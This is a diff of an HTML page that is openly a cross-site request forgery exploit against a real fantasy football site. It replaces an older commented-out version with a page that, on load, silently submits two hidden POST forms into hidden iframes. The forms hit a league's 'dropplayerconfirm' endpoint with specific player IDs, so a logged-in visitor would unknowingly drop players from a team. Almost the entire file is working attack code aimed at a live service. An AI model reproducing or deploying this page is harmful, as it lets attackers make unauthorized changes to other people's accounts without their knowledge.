@@ -1,5 +1,5 @@
-<html>
-    <form name="testform2" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm" target="_blank">
+<!-- <html>
+    <form name="testform2" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm">
         <input type="hidden" name="dropPlayerId&#91;&#93;" value="2571859" />
     </form>
 
@@ -12,10 +12,39 @@
    </script>
    
 
-    <form name="testform1" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm" target="_blank">
+    <form name="testform1" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm">
         <input type="hidden" name="dropPlayerId&#91;&#93;" value="2560781" />
     </form>
     <script type="text/javascript">
         document.testform1.submit();
     </script>
+<html> -->
+
 <html>
+    <head>
+        <script language="javascript">
+
+            window.onload = function() {
+                document.getElementById("csrfForm1").submit();
+                document.getElementById("csrfForm2").submit();
+            }
+
+        </script>
+    </head>
+    <body>
+
+        <form id="csrfForm1" action=https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm method="POST" target="csrfIframe1">
+            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2569726" />
+            <!-- fill in form data here -->
+        </form>
+
+        <form id="csrfForm2" action=https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm method="POST" target="csrfIframe1">
+            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2567973" />
+        </form>
+
+        <!-- hidden iframes -->
+        <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe1"></iframe>
+        <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe2"></iframe>
+
+    </body>
+</html>
